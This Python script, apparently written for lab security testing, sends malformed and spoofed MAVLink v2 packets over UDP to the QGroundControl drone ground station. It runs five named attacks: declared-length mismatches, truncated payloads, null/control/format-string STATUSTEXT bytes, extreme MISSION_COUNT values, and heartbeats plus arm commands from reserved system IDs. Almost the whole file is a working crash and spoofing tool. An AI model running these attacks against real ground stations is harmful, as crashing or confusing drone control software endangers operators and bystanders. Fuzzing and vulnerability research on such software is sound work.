"""
vuln_tester.py
=======================
Targeted vulnerability tests on QGC.
Each attack is based on a specific bug class (NOT random fuzzing).

Attacks implemented:
  1. LENGTH MISMATCH    — LEN says 255 but payload is 0 → buffer over-read
  2. SHORT PAYLOAD      — msgid with too-short payload → null deref
  3. STATUSTEXT NULL    — null byte in critical position
  4. MISSION_COUNT OOB  — count=65535 → memory exhaustion / count=0 → div-by-zero
  5. SYSID ZERO         — sysid=0 reserved → anomalous behavior in vehicle management

Uso:
    python3 vuln_tester.py --attack 1
    python3 vuln_tester.py --attack 2
    python3 vuln_tester.py --attack 3
    python3 vuln_tester.py --attack 4
    python3 vuln_tester.py --attack 5
    python3 vuln_tester.py --attack ALL

IMPORTANT: Monitor QGC on Windows during each test.
If it crashes → note which attack was active.

Requirements:
    pip3 install pymavlink --break-system-packages
"""

import socket
import struct
import time
import argparse
from datetime import datetime

# ═══════════════════════════════════════════════════════════════
#  CONFIG — aggiorna se necessario
# ═══════════════════════════════════════════════════════════════

TARGET_IP   = "172.25.0.1"
TARGET_PORT = 14550          # main port with 3 drones
ATTACKER_SYSID  = 1
ATTACKER_COMPID = 1

# ═══════════════════════════════════════════════════════════════

MAV_V2_STX = 0xFD

CRC_EXTRA = {
    0:   50,   # HEARTBEAT
    1:   124,  # SYS_STATUS
    30:  39,   # ATTITUDE
    33:  104,  # GLOBAL_POSITION_INT
    44:  221,  # MISSION_COUNT
    45:  232,  # MISSION_CLEAR_ALL
    76:  152,  # COMMAND_LONG
    253: 83,   # STATUSTEXT
}


def compute_crc(data: bytes, seed: int) -> int:
    crc = 0xFFFF
    for byte in data:
        tmp = byte ^ (crc & 0xFF)
        tmp = (tmp ^ (tmp << 4)) & 0xFF
        crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    tmp = seed ^ (crc & 0xFF)
    tmp = (tmp ^ (tmp << 4)) & 0xFF
    crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    return crc


def build_packet(sysid: int, compid: int, msgid: int,
                 payload: bytes, seq: int,
                 override_len: int = None) -> bytes:
    """
    Costruisce pacchetto MAVLink v2.
    override_len permette di dichiarare una lunghezza diversa
    da quella reale del payload — usato per l'attacco 1.
    """
    declared_len = override_len if override_len is not None else len(payload)
    crc_extra = CRC_EXTRA.get(msgid, 0)
    msgid_bytes = msgid.to_bytes(3, 'little')

    header = bytes([
        MAV_V2_STX,
        declared_len & 0xFF,  # lunghezza dichiarata (può essere falsa)
        0x00, 0x00,
        seq & 0xFF,
        sysid,
        compid,
    ]) + msgid_bytes

    # CRC calcolato sul payload reale
    crc_val   = compute_crc(header[1:] + payload, crc_extra)
    crc_bytes = struct.pack('<H', crc_val)

    return header + payload + crc_bytes


class VulnTester:
    def __init__(self, ip: str, port: int):
        self.sock   = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.target = (ip, port)
        self.seq    = 0

    def send(self, pkt: bytes, label: str = ""):
        self.sock.sendto(pkt, self.target)
        self.seq = (self.seq + 1) % 256
        if label:
            print(f"    [→] {label} ({len(pkt)} bytes totali)")

    def close(self):
        self.sock.close()


# ─── Attacco 1: Length Mismatch ───────────────────────────────
def attack_1_length_mismatch(tester: VulnTester, count: int = 50):
    """
    LEN declares 255 bytes but the real payload is 0.
    QGC's parser tries to read 255 bytes beyond the allocated
    buffer → buffer over-read → potential crash.

    Tested variants:
    - LEN=255, payload=0
    - LEN=255, payload=1
    - LEN=1,   payload=255  (reverse overflow)
    - LEN=0,   payload=255
    """
    print(f"\n{'='*60}")
    print(f"  [ATTACK 1] Length Mismatch — buffer over-read")
    print(f"  Target: {tester.target}")
    print(f"  Logic: declared LEN ≠ real payload")
    print(f"{'='*60}\n")

    variants = [
        # (msgid, payload_reale, len_dichiarato, descrizione)
        (0,   b'',                   255, "HEARTBEAT: LEN=255 payload=0"),
        (0,   b'\x00',               255, "HEARTBEAT: LEN=255 payload=1"),
        (0,   b'\x00' * 255,         0,   "HEARTBEAT: LEN=0   payload=255"),
        (0,   b'\x00' * 255,         1,   "HEARTBEAT: LEN=1   payload=255"),
        (33,  b'',                   255, "GLOBAL_POS: LEN=255 payload=0"),
        (33,  b'',                   28,  "GLOBAL_POS: LEN=28  payload=0"),
        (253, b'',                   255, "STATUSTEXT: LEN=255 payload=0"),
        (253, b'',                   51,  "STATUSTEXT: LEN=51  payload=0"),
        (76,  b'',                   255, "COMMAND_LONG: LEN=255 payload=0"),
        (76,  b'',                   33,  "COMMAND_LONG: LEN=33  payload=0"),
        (44,  b'',                   255, "MISSION_COUNT: LEN=255 payload=0"),
    ]

    for iteration in range(count):
        for msgid, payload, declared_len, desc in variants:
            pkt = build_packet(
                ATTACKER_SYSID, ATTACKER_COMPID,
                msgid, payload, tester.seq,
                override_len=declared_len,
            )
            tester.send(pkt, f"iter={iteration+1} {desc}")
            time.sleep(0.05)

        if iteration % 10 == 0:
            print(f"  [{iteration+1}/{count}] iterations complete — QGC still alive?")

    print(f"\n  [+] Attack 1 complete. {count * len(variants)} packets sent.")


# ─── Attacco 2: Short Payload ─────────────────────────────────
def attack_2_short_payload(tester: VulnTester):
    """
    Sends known msgids with payload shorter than expected.
    QGC's C++ parser tries to struct.unpack on a buffer
    shorter than expected → potential crash from out-of-bounds access.

    Lunghezze attese:
    - HEARTBEAT (0):          9 bytes
    - GLOBAL_POSITION_INT(33): 28 bytes
    - ATTITUDE (30):          28 bytes
    - COMMAND_LONG (76):      33 bytes
    - STATUSTEXT (253):       51 bytes
    - MISSION_COUNT (44):      4 bytes
    """
    print(f"\n{'='*60}")
    print(f"  [ATTACK 2] Short Payload — null/out-of-bounds read")
    print(f"  Target: {tester.target}")
    print(f"  Logic: payload shorter than expected → crash in parser")
    print(f"{'='*60}\n")

    # (msgid, lunghezza_attesa, descrizione)
    targets = [
        (0,   9,  "HEARTBEAT"),
        (33,  28, "GLOBAL_POSITION_INT"),
        (30,  28, "ATTITUDE"),
        (31,  48, "ATTITUDE_QUATERNION"),
        (76,  33, "COMMAND_LONG"),
        (253, 51, "STATUSTEXT"),
        (44,  4,  "MISSION_COUNT"),
        (32,  28, "LOCAL_POSITION_NED"),
        (83,  37, "ATTITUDE_TARGET"),
        (1,   31, "SYS_STATUS"),
    ]

    # Lunghezze da testare: 0, 1, metà, attesa-1
    for msgid, expected_len, name in targets:
        test_lengths = [0, 1, expected_len // 2, expected_len - 1]
        for length in test_lengths:
            if length < 0:
                continue
            payload = bytes(length)  # payload di soli zero
            pkt = build_packet(
                ATTACKER_SYSID, ATTACKER_COMPID,
                msgid, payload, tester.seq,
            )
            tester.send(pkt, f"{name} (atteso={expected_len}, inviato={length})")
            time.sleep(0.03)

    # Ripeti 20 volte i casi più critici
    print(f"\n  Ripetizione casi critici (20x)...")
    critical = [
        (0,   b'',   "HEARTBEAT vuoto"),
        (76,  b'',   "COMMAND_LONG vuoto"),
        (253, b'',   "STATUSTEXT vuoto"),
        (44,  b'',   "MISSION_COUNT vuoto"),
        (0,   b'\x00', "HEARTBEAT 1 byte"),
        (33,  b'\x00', "GLOBAL_POS 1 byte"),
    ]
    for _ in range(20):
        for msgid, payload, desc in critical:
            pkt = build_packet(
                ATTACKER_SYSID, ATTACKER_COMPID,
                msgid, payload, tester.seq,
            )
            tester.send(pkt, desc)
            time.sleep(0.02)

    print(f"\n  [+] Attack 2 complete.")


# ─── Attacco 3: STATUSTEXT Null Byte ─────────────────────────
def attack_3_statustext_null(tester: VulnTester, count: int = 100):
    """
    Tests anomalous behavior in Qt rendering of STATUSTEXT
    with null bytes, control characters and problematic sequences
    in critical payload positions.

    The severity field (byte 0) and text (bytes 1-50) are passed
    directly to Qt rendering — possible crashes in the
    text display layer.
    """
    print(f"\n{'='*60}")
    print(f"  [ATTACK 3] STATUSTEXT Null/Control Byte Injection")
    print(f"  Target: {tester.target}")
    print(f"  Logic: special characters in Qt rendering")
    print(f"{'='*60}\n")

    variants = [
        # (severity, testo, descrizione)
        (0,   b'\x00' * 50,                    "severity=0 testo tutto null"),
        (255, b'A' * 50,                        "severity=255 (fuori range)"),
        (6,   b'\x00' + b'A' * 49,             "null in posizione 0 del testo"),
        (6,   b'A' * 25 + b'\x00' + b'A' * 24, "null a metà testo"),
        (6,   b'\xff' * 50,                    "testo tutto 0xFF"),
        (6,   b'\x0a' * 50,                    "testo tutto newline (0x0A)"),
        (6,   b'\x0d' * 50,                    "testo tutto carriage return"),
        (6,   b'\x1b[31m' + b'A' * 46,         "escape ANSI nel testo"),
        (6,   b'%n%s%x%n%s%x%n%s%x%n%s%x%n%s%x%n%s%x%n', "format string estesa"),
        (6,   b'\x00\xff\x00\xff\x00\xff' * 8 + b'\x00\xff', "alternanza null/FF"),
        # Lunghezze anomale
        (6,   b'',                              "testo vuoto (solo severity)"),
        (6,   b'A',                             "testo 1 byte"),
        (6,   b'A' * 49,                        "testo 49 bytes (atteso 50)"),
        (6,   b'A' * 51,                        "testo 51 bytes (overflow +1)"),
        (6,   b'A' * 100,                       "testo 100 bytes (overflow 2x)"),
        (6,   b'A' * 255,                       "testo 255 bytes (max MAVLink)"),
    ]

    for iteration in range(count):
        for severity, text, desc in variants:
            payload = bytes([severity]) + text
            pkt = build_packet(
                ATTACKER_SYSID, ATTACKER_COMPID,
                253, payload, tester.seq,
            )
            tester.send(pkt, f"iter={iteration+1} {desc}")
            time.sleep(0.02)

        if iteration % 20 == 0:
            print(f"  [{iteration+1}/{count}] iterations — QGC alive?")

    print(f"\n  [+] Attack 3 complete.")


# ─── Attacco 4: MISSION_COUNT Out-of-Bounds ──────────────────
def attack_4_mission_count(tester: VulnTester):
    """
    MISSION_COUNT (msgid=44) announces how many waypoints will follow.
    QGC allocates data structures based on this number.

    Extreme values tested:
    - count=65535 → huge allocation → memory exhaustion
    - count=0     → division by zero or empty array
    - count=1     → then send no waypoints → timeout loop
    - count=65534 → boundary condition

    Payload MISSION_COUNT: count(uint16) + target_sys + target_comp
    """
    print(f"\n{'='*60}")
    print(f"  [ATTACK 4] MISSION_COUNT Out-of-Bounds")
    print(f"  Target: {tester.target}")
    print(f"  Logic: extreme counts cause memory issues in QGC")
    print(f"{'='*60}\n")

    counts = [
        (65535, "MAX uint16 — memory exhaustion"),
        (0,     "ZERO — divisione per zero / array vuoto"),
        (65534, "MAX-1 — boundary condition"),
        (32768, "metà uint16"),
        (1,     "count=1 senza waypoint — loop in attesa"),
        (255,   "255 waypoint annunciati"),
        (256,   "256 boundary byte overflow"),
        (0xFFFF, "0xFFFF esplicito"),
        (0x8000, "MSB settato"),
    ]

    for count_val, desc in counts:
        # Payload: count (uint16 LE) + target_system + target_component
        payload = struct.pack('<HBB', count_val, 1, 1)
        pkt = build_packet(
            ATTACKER_SYSID, ATTACKER_COMPID,
            44, payload, tester.seq,
        )
        tester.send(pkt, f"count={count_val} — {desc}")
        time.sleep(0.5)  # longer pause to allow QGC to process

    # Ripeti i più critici 10 volte
    print(f"\n  Ripetizione casi critici...")
    for _ in range(10):
        for count_val in [65535, 0, 65534]:
            payload = struct.pack('<HBB', count_val, 1, 1)
            pkt = build_packet(
                ATTACKER_SYSID, ATTACKER_COMPID,
                44, payload, tester.seq,
            )
            tester.send(pkt, f"count={count_val} ripetizione")
            time.sleep(0.2)

    print(f"\n  [+] Attack 4 complete.")


# ─── Attacco 5: sysid=0 Reserved ─────────────────────────────
def attack_5_sysid_zero(tester: VulnTester, count: int = 50):
    """
    sysid=0 is reserved in the MAVLink standard and should never
    appear in real communications.

    QGC internally manages a vehicle list indexed by sysid.
    Receiving messages from sysid=0 may cause:
    - Index out of bounds in the vehicle array
    - Null pointer dereference
    - Insertion of a 'ghost' vehicle with ID 0

    Also tests sysid=254 (another reserved) and sysid=256 (overflow).
    """
    print(f"\n{'='*60}")
    print(f"  [ATTACK 5] Reserved sysid — array index anomaly")
    print(f"  Target: {tester.target}")
    print(f"  Logic: reserved sysids cause anomalous behavior")
    print(f"{'='*60}\n")

    reserved_sysids = [
        (0,   "sysid=0 — riservato MAVLink"),
        (254, "sysid=254 — quasi broadcast"),
        (100, "sysid=100 — non presente nella flotta"),
        (200, "sysid=200 — fuori range flotta"),
    ]

    # HEARTBEAT payload valido
    def make_heartbeat(sysid):
        payload = struct.pack('<IBBBBB',
            0,   # custom_mode
            2,   # MAV_TYPE_QUADROTOR
            12,  # MAV_AUTOPILOT_PX4
            0x80,# base_mode: armed
            4,   # system_status: ACTIVE
            3,   # mavlink_version
        )
        return build_packet(sysid, 1, 0, payload, tester.seq)

    for iteration in range(count):
        for sysid, desc in reserved_sysids:
            # Manda HEARTBEAT dal sysid anomalo
            pkt = make_heartbeat(sysid)
            tester.send(pkt, f"iter={iteration+1} HEARTBEAT da {desc}")
            time.sleep(0.05)

            # Poi manda COMMAND_LONG dallo stesso sysid anomalo
            payload = struct.pack('<fffffffBBHB',
                1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,
                1,    # target_system
                1,    # target_component
                400,  # MAV_CMD_COMPONENT_ARM_DISARM
                0,
            )
            pkt2 = build_packet(sysid, 1, 76, payload, tester.seq)
            tester.send(pkt2, f"COMMAND_LONG da {desc}")
            time.sleep(0.05)

        if iteration % 10 == 0:
            print(f"  [{iteration+1}/{count}] iterations — QGC alive?")

    print(f"\n  [+] Attack 5 complete.")


# ─── MAIN ─────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="vuln_tester.py — Targeted vulnerability tests on QGC"
    )
    parser.add_argument("--attack", required=True,
                        choices=["1","2","3","4","5","ALL"],
                        help="Attack to run (1-5 or ALL)")
    parser.add_argument("--target-ip",   default=TARGET_IP)
    parser.add_argument("--target-port", type=int, default=TARGET_PORT)
    parser.add_argument("--count",       type=int, default=None,
                        help="Numero iterazioni (dove applicabile)")
    args = parser.parse_args()

    print(f"\n{'='*60}")
    print(f"  vuln_tester.py — QGC Vulnerability Tester")
    print(f"  Target  : {args.target_ip}:{args.target_port}")
    print(f"  Attack  : {args.attack}")
    print(f"  Time    : {datetime.now().strftime('%H:%M:%S')}")
    print(f"{'='*60}")
    print(f"\n  !! MONITOR QGC ON WINDOWS — Task Manager open !!")
    print(f"  !! If QGC crashes, immediately note which attack was active !!\n")
    time.sleep(2)

    tester = VulnTester(args.target_ip, args.target_port)

    try:
        if args.attack == "1":
            attack_1_length_mismatch(tester, count=args.count or 30)

        elif args.attack == "2":
            attack_2_short_payload(tester)

        elif args.attack == "3":
            attack_3_statustext_null(tester, count=args.count or 50)

        elif args.attack == "4":
            attack_4_mission_count(tester)

        elif args.attack == "5":
            attack_5_sysid_zero(tester, count=args.count or 30)

        elif args.attack == "ALL":
            print("\n[*] Esecuzione sequenziale di tutti gli attacchi.\n")
            print("    Pausa di 3 secondi tra un attacco e l'altro.\n")

            attack_2_short_payload(tester)
            time.sleep(3)

            attack_4_mission_count(tester)
            time.sleep(3)

            attack_5_sysid_zero(tester, count=20)
            time.sleep(3)

            attack_1_length_mismatch(tester, count=20)
            time.sleep(3)

            attack_3_statustext_null(tester, count=30)

    except KeyboardInterrupt:
        print(f"\n[!] Interrupted by user.")
    finally:
        tester.close()
        print(f"\n{'='*60}")
        print(f"  Test complete. Check if QGC is still running.")
        print(f"{'='*60}\n")


if __name__ == "__main__":
    main()